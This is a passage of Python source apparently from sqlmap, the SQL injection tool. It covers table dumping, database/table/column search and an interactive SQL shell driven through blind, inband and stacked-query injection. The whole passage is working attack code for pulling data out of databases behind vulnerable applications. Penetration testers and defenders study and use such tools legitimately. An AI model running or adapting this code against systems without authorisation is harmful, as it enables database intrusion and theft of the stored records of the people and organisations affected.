                        kb.data.dumpedTable[column]["values"].append(colEntry)

                    index += 1

        if not kb.data.dumpedTable and not conf.direct:
            infoMsg = "fetching number of "
            if conf.col:
                infoMsg += "columns '%s' " % colString
            infoMsg += "entries for table '%s' " % conf.tbl
            infoMsg += "on database '%s'" % conf.db
            logger.info(infoMsg)

            if kb.dbms == "Oracle":
                query = rootQuery.blind.count % conf.tbl.upper()
            elif kb.dbms == "SQLite":
                query = rootQuery.blind.count % conf.tbl
            else:
                query = rootQuery.blind.count % (conf.db, conf.tbl)
            count = inject.getValue(query, inband=False, expected="int", charsetType=2)

            if not count.isdigit() or not len(count) or count == "0":
                warnMsg = "unable to retrieve the number of "
                if conf.col:
                    warnMsg += "columns '%s' " % colString
                warnMsg += "entries for table '%s' " % conf.tbl
                warnMsg += "on database '%s'" % conf.db

                logger.warn(warnMsg)

                return None

            lengths = {}
            entries = {}

            if kb.dbms == "Oracle":
                plusOne = True
            else:
                plusOne = False
            indexRange = getRange(count, dump=True, plusOne=plusOne)

            for index in indexRange:
                for column in colList:
                    if column not in lengths:
                        lengths[column] = 0

                    if column not in entries:
                        entries[column] = []

                    if kb.dbms in ( "MySQL", "PostgreSQL" ):
                        query = rootQuery.blind.query % (column, conf.db,
                                                               conf.tbl, index)
                    elif kb.dbms == "Oracle":
                        query = rootQuery.blind.query % (column, column,
                                                               conf.tbl.upper(),
                                                               index)
                    elif kb.dbms == "Microsoft SQL Server":
                        query = rootQuery.blind.query % (column, conf.db,
                                                               conf.tbl, column,
                                                               index, column,
                                                               conf.db, conf.tbl)
                    elif kb.dbms == "SQLite":
                        query = rootQuery.blind.query % (column, conf.tbl, index)

                    value = inject.getValue(query, inband=False)

                    lengths[column] = max(lengths[column], len(value))
                    entries[column].append(value)

            for column, columnEntries in entries.items():
                if lengths[column] < len(column):
                    length = len(column)
                else:
                    length = lengths[column]

                kb.data.dumpedTable[column] = { "length": length,
                                                "values": columnEntries }

                entriesCount = len(columnEntries)

        if kb.data.dumpedTable:
            kb.data.dumpedTable["__infos__"] = { "count": entriesCount,
                                                 "table": conf.tbl,
                                                 "db":    conf.db }
        else:
            warnMsg = "unable to retrieve the entries of "
            if conf.col:
                warnMsg += "columns '%s' " % colString
            warnMsg += "for table '%s' " % conf.tbl
            warnMsg += "on database '%s'" % conf.db

            logger.warn(warnMsg)

            return None

        return kb.data.dumpedTable

    def dumpAll(self):
        if kb.dbms == "MySQL" and not kb.data.has_information_schema:
            errMsg  = "information_schema not available, "
            errMsg += "back-end DBMS is MySQL < 5.0"
            raise sqlmapUnsupportedFeatureException, errMsg

        conf.db              = None
        conf.tbl             = None
        conf.col             = None
        kb.data.cachedDbs    = []
        kb.data.cachedTables = self.getTables()

        for db, tables in kb.data.cachedTables.items():
            conf.db = db

            for table in tables:
                conf.tbl = table
                kb.data.cachedColumns = {}
                kb.data.dumpedTable = {}

                data = self.dumpTable()

                if data:
                    conf.dumper.dbTableValues(data)

    def dumpFoundColumn(self, dbs, foundCols, colConsider):
        if not dbs:
            warnMsg = "no databases have tables containing any of the "
            warnMsg += "provided columns"
            logger.warn(warnMsg)
            return

        conf.dumper.dbColumns(foundCols, colConsider, dbs)

        message = "do you want to dump entries? [Y/n] "
        output = readInput(message, default="Y")

        if output and output[0] not in ("y", "Y"):
            return

        dumpFromDbs = []
        message = "which database(s)?\n[a]ll (default)\n"

        for db, tblData in dbs.items():
            if tblData:
                message += "[%s]\n" % db

        message += "[q]uit"
        test = readInput(message, default="a")

        if not test or test in ("a", "A"):
            dumpFromDbs = dbs.keys()
        elif test in ("q", "Q"):
            return
        else:
            dumpFromDbs = test.replace(" ", "").split(",")

        for db, tblData in dbs.items():
            if db not in dumpFromDbs or not tblData:
                continue

            conf.db = db
            dumpFromTbls = []
            message = "which table(s) of database '%s'?\n" % db
            message += "[a]ll (default)\n"

            for tbl in tblData:
                message += "[%s]\n" % tbl

            message += "[s]kip\n"
            message += "[q]uit"
            test = readInput(message, default="a")

            if not test or test in ("a", "A"):
                dumpFromTbls = tblData
            elif test in ("s", "S"):
                continue
            elif test in ("q", "Q"):
                return
            else:
                dumpFromTbls = test.replace(" ", "").split(",")

            for table, columns in tblData.items():
                if table not in dumpFromTbls:
                    continue

                conf.tbl = table
                conf.col = ",".join(column for column in columns)
                kb.data.cachedColumns = {}
                kb.data.dumpedTable = {}

                data = self.dumpTable()

                if data:
                    conf.dumper.dbTableValues(data)

    def searchDb(self):
        foundDbs = []
        rootQuery = queries[kb.dbms].search_db
        dbList = conf.db.split(",")

        if kb.dbms == "MySQL" and not kb.data.has_information_schema:
            dbCond = rootQuery.inband.condition2
        else:
            dbCond = rootQuery.inband.condition

        dbConsider, dbCondParam = self.likeOrExact("database")

        for db in dbList:
            infoMsg = "searching database"
            if dbConsider == "1":
                infoMsg += "s like"
            infoMsg += " '%s'" % db
            logger.info(infoMsg)

            if conf.excludeSysDbs:
                exclDbsQuery = "".join(" AND '%s' != %s" % (db, dbCond) for db in self.excludeDbsList)
                infoMsg = "skipping system databases '%s'" % ", ".join(db for db in self.excludeDbsList)
                logger.info(infoMsg)
            else:
                exclDbsQuery = ""

            dbQuery = "%s%s" % (dbCond, dbCondParam)
            dbQuery = dbQuery % db

            if kb.unionPosition or conf.direct:
                if kb.dbms == "MySQL" and not kb.data.has_information_schema:
                    query = rootQuery.inband.query2
                else:
                    query = rootQuery.inband.query
                query += dbQuery
                query += exclDbsQuery
                values = inject.getValue(query, blind=False)

                if values:
                    if isinstance(values, basestring):
                        values = [ values ]

                    for value in values:
                        foundDbs.append(value)
            else:
                infoMsg = "fetching number of databases"
                if dbConsider == "1":
                    infoMsg += "s like"
                infoMsg += " '%s'" % db
                logger.info(infoMsg)

                if kb.dbms == "MySQL" and not kb.data.has_information_schema:
                    query = rootQuery.blind.count2
                else:
                    query = rootQuery.blind.count
                query += dbQuery
                query += exclDbsQuery
                count = inject.getValue(query, inband=False, expected="int", charsetType=2)

                if not count.isdigit() or not len(count) or count == "0":
                    warnMsg  = "no database"
                    if dbConsider == "1":
                        warnMsg += "s like"
                    warnMsg += " '%s' found" % db
                    logger.warn(warnMsg)

                    continue

                indexRange = getRange(count)

                for index in indexRange:
                    if kb.dbms == "MySQL" and not kb.data.has_information_schema:
                        query = rootQuery.blind.query2
                    else:
                        query = rootQuery.blind.query
                    query += dbQuery
                    query += exclDbsQuery
                    query = agent.limitQuery(index, query, dbCond)

                    foundDbs.append(inject.getValue(query, inband=False))

        return foundDbs

    def searchTable(self):
        if kb.dbms == "MySQL" and not kb.data.has_information_schema:
            errMsg  = "information_schema not available, "
            errMsg += "back-end DBMS is MySQL < 5.0"
            raise sqlmapUnsupportedFeatureException, errMsg

        rootQuery = queries[kb.dbms].search_table
        foundTbls = {}
        tblList = conf.tbl.split(",")
        tblCond = rootQuery.inband.condition
        dbCond = rootQuery.inband.condition2

        tblConsider, tblCondParam = self.likeOrExact("table")

        for tbl in tblList:
            if kb.dbms == "Oracle":
                tbl = tbl.upper()

            infoMsg = "searching table"
            if tblConsider == "1":
                infoMsg += "s like"
            infoMsg += " '%s'" % tbl
            logger.info(infoMsg)

            if conf.excludeSysDbs:
                exclDbsQuery = "".join(" AND '%s' != %s" % (db, dbCond) for db in self.excludeDbsList)
                infoMsg = "skipping system databases '%s'" % ", ".join(db for db in self.excludeDbsList)
                logger.info(infoMsg)
            else:
                exclDbsQuery = ""

            tblQuery = "%s%s" % (tblCond, tblCondParam)
            tblQuery = tblQuery % tbl

            if kb.unionPosition or conf.direct:
                query = rootQuery.inband.query
                query += tblQuery
                query += exclDbsQuery
                values = inject.getValue(query, blind=False)

                if values:
                    if isinstance(values, basestring):
                        values = [ values ]

                    for foundDb, foundTbl in values:
                        if foundDb in foundTbls:
                            foundTbls[foundDb].append(foundTbl)
                        else:
                            foundTbls[foundDb] = [ foundTbl ]
            else:
                infoMsg = "fetching number of databases with table"
                if tblConsider == "1":
                    infoMsg += "s like"
                infoMsg += " '%s'" % tbl
                logger.info(infoMsg)

                query = rootQuery.blind.count
                query += tblQuery
                query += exclDbsQuery
                count = inject.getValue(query, inband=False, expected="int", charsetType=2)

                if not count.isdigit() or not len(count) or count == "0":
                    warnMsg  = "no databases have table"
                    if tblConsider == "1":
                        warnMsg += "s like"
                    warnMsg += " '%s'" % tbl
                    logger.warn(warnMsg)

                    continue

                indexRange = getRange(count)

                for index in indexRange:
                    query = rootQuery.blind.query
                    query += tblQuery
                    query += exclDbsQuery
                    query = agent.limitQuery(index, query)
                    foundDb = inject.getValue(query, inband=False)
                    foundTbls[foundDb] = []

                    if tblConsider == "2":
                        foundTbls[foundDb].append(tbl)

                if tblConsider == "2":
                    continue

                for db in foundTbls.keys():
                    infoMsg = "fetching number of table"
                    if tblConsider == "1":
                        infoMsg += "s like"
                    infoMsg += " '%s' in database '%s'" % (tbl, db)
                    logger.info(infoMsg)

                    query = rootQuery.blind.count2
                    query = query % db
                    query += " AND %s" % tblQuery
                    count = inject.getValue(query, inband=False, expected="int", charsetType=2)

                    if not count.isdigit() or not len(count) or count == "0":
                        warnMsg = "no table"
                        if tblConsider == "1":
                            warnMsg += "s like"
                        warnMsg += " '%s' " % tbl
                        warnMsg += "in database '%s'" % db
                        logger.warn(warnMsg)

                        continue

                    indexRange = getRange(count)

                    for index in indexRange:
                        query = rootQuery.blind.query2
                        query = query % db
                        query += " AND %s" % tblQuery
                        query = agent.limitQuery(index, query)
                        foundTbl = inject.getValue(query, inband=False)
                        kb.hintValue = foundTbl
                        foundTbls[db].append(foundTbl)

        return foundTbls

    def searchColumn(self):
        if kb.dbms == "MySQL" and not kb.data.has_information_schema:
            errMsg  = "information_schema not available, "
            errMsg += "back-end DBMS is MySQL < 5.0"
            raise sqlmapUnsupportedFeatureException, errMsg

        rootQuery = queries[kb.dbms].search_column
        foundCols = {}
        dbs = {}
        colList = conf.col.split(",")
        colCond = rootQuery.inband.condition
        dbCond = rootQuery.inband.condition2

        colConsider, colCondParam = self.likeOrExact("column")

        for column in colList:
            infoMsg = "searching column"
            if colConsider == "1":
                infoMsg += "s like"
            infoMsg += " '%s'" % column
            logger.info(infoMsg)

            foundCols[column] = {}

            if conf.excludeSysDbs:
                exclDbsQuery = "".join(" AND '%s' != %s" % (db, dbCond) for db in self.excludeDbsList)
                infoMsg = "skipping system databases '%s'" % ", ".join(db for db in self.excludeDbsList)
                logger.info(infoMsg)
            else:
                exclDbsQuery = ""

            colQuery = "%s%s" % (colCond, colCondParam)
            colQuery = colQuery % column

            if kb.unionPosition or conf.direct:
                query = rootQuery.inband.query
                query += colQuery
                query += exclDbsQuery
                values = inject.getValue(query, blind=False)

                if values:
                    if isinstance(values, basestring):
                        values = [ values ]

                    for foundDb, foundTbl in values:
                        if foundDb not in dbs:
                            dbs[foundDb] = {}

                        if foundTbl not in dbs[foundDb]:
                            dbs[foundDb][foundTbl] = {}

                        if colConsider == "1":
                            conf.db = foundDb
                            conf.tbl = foundTbl
                            conf.col = column

                            self.getColumns(onlyColNames=True)

                            dbs[foundDb][foundTbl].update(kb.data.cachedColumns[foundDb][foundTbl])
                            kb.data.cachedColumns = {}
                        else:
                            dbs[foundDb][foundTbl][column] = None

                        if foundDb in foundCols[column]:
                            foundCols[column][foundDb].append(foundTbl)
                        else:
                            foundCols[column][foundDb] = [ foundTbl ]
            else:
                infoMsg = "fetching number of databases with tables containing column"
                if colConsider == "1":
                    infoMsg += "s like"
                infoMsg += " '%s'" % column
                logger.info(infoMsg)

                query = rootQuery.blind.count
                query += colQuery
                query += exclDbsQuery
                count = inject.getValue(query, inband=False, expected="int", charsetType=2)

                if not count.isdigit() or not len(count) or count == "0":
                    warnMsg  = "no databases have tables containing column"
                    if colConsider == "1":
                        warnMsg += "s like"
                    warnMsg += " '%s'" % column
                    logger.warn(warnMsg)

                    continue

                indexRange = getRange(count)

                for index in indexRange:
                    query = rootQuery.blind.query
                    query += colQuery
                    query += exclDbsQuery
                    query = agent.limitQuery(index, query)
                    db = inject.getValue(query, inband=False)

                    if db not in dbs:
                        dbs[db] = {}

                    if db not in foundCols[column]:
                        foundCols[column][db] = []

                for column, dbData in foundCols.items():
                    colQuery = "%s%s" % (colCond, colCondParam)
                    colQuery = colQuery % column

                    for db in dbData:
                        infoMsg = "fetching number of tables containing column"
                        if colConsider == "1":
                            infoMsg += "s like"
                        infoMsg += " '%s' in database '%s'" % (column, db)
                        logger.info(infoMsg)

                        query = rootQuery.blind.count2
                        query = query % db
                        query += " AND %s" % colQuery
                        count = inject.getValue(query, inband=False, expected="int", charsetType=2)

                        if not count.isdigit() or not len(count) or count == "0":
                            warnMsg = "no tables contain column"
                            if colConsider == "1":
                                warnMsg += "s like"
                            warnMsg += " '%s' " % column
                            warnMsg += "in database '%s'" % db
                            logger.warn(warnMsg)

                            continue

                        indexRange = getRange(count)

                        for index in indexRange:
                            query = rootQuery.blind.query2
                            query = query % db
                            query += " AND %s" % colQuery
                            query = agent.limitQuery(index, query)
                            tbl = inject.getValue(query, inband=False)
                            kb.hintValue = tbl

                            if tbl not in dbs[db]:
                                dbs[db][tbl] = {}

                            if colConsider == "1":
                                conf.db = db
                                conf.tbl = tbl
                                conf.col = column

                                self.getColumns(onlyColNames=True)

                                dbs[db][tbl].update(kb.data.cachedColumns[db][tbl])
                                kb.data.cachedColumns = {}
                            else:
                                dbs[db][tbl][column] = None

                            foundCols[column][db].append(tbl)

        self.dumpFoundColumn(dbs, foundCols, colConsider)

    def search(self):
        if conf.db:
            conf.dumper.lister("found databases", self.searchDb())

        if conf.tbl:
            conf.dumper.dbTables(self.searchTable())

        if conf.col:
            self.searchColumn()

        if not conf.db and not conf.tbl and not conf.col:
            errMsg = "missing parameter, provide -D, -T or -C together "
            errMsg += "with --search"
            raise sqlmapMissingMandatoryOptionException, errMsg

    def sqlQuery(self, query):
        output  = None
        sqlType = None

        for sqlTitle, sqlStatements in SQL_STATEMENTS.items():
            for sqlStatement in sqlStatements:
                if query.lower().startswith(sqlStatement):
                    sqlType = sqlTitle

                    break

        message   = "do you want to retrieve the SQL statement output? "
        message  += "[Y/n] "
        getOutput = readInput(message, default="Y")

        if not getOutput or getOutput in ("y", "Y"):
            infoMsg = "fetching %s query output: '%s'" % (sqlType if sqlType is not None else "SQL", query)
            logger.info(infoMsg)

            output = inject.getValue(query, fromUser=True)

            return output
        else:
            query = urlencode(query, convall=True)

            if kb.stackedTest is None:
                stackedTest()

            if not kb.stackedTest and not conf.direct:
                warnMsg  = "execution of custom SQL queries is only "
                warnMsg += "available when stacked queries are supported"
                logger.warn(warnMsg)
                return None
            else:
                if sqlType:
                    infoMsg = "executing %s query: '%s'" % (sqlType if sqlType is not None else "SQL", query)
                else:
                    infoMsg = "executing unknown SQL type query: '%s'" % query
                logger.info(infoMsg)

                inject.goStacked(query)

                infoMsg = "done"
                logger.info(infoMsg)

                output = False

        return output

    def sqlShell(self):
        infoMsg  = "calling %s shell. To quit type " % kb.dbms
        infoMsg += "'x' or 'q' and press ENTER"
        logger.info(infoMsg)

        autoCompletion(sqlShell=True)

        while True:
            query = None

            try:
                query = raw_input("sql-shell> ")
                query = utf8decode(query)
            except KeyboardInterrupt:
                print
                errMsg = "user aborted"
                logger.error(errMsg)
            except EOFError:
                print
                errMsg = "exit"
                logger.error(errMsg)
                break

            if not query:
                continue

            if query.lower() in ( "x", "q", "exit", "quit" ):
                break

            output = self.sqlQuery(query)

            if output and output != "Quit":
                conf.dumper.query(query, output)

            elif not output:
                pass

            elif output != "Quit":
                dataToStdout("No output\n")
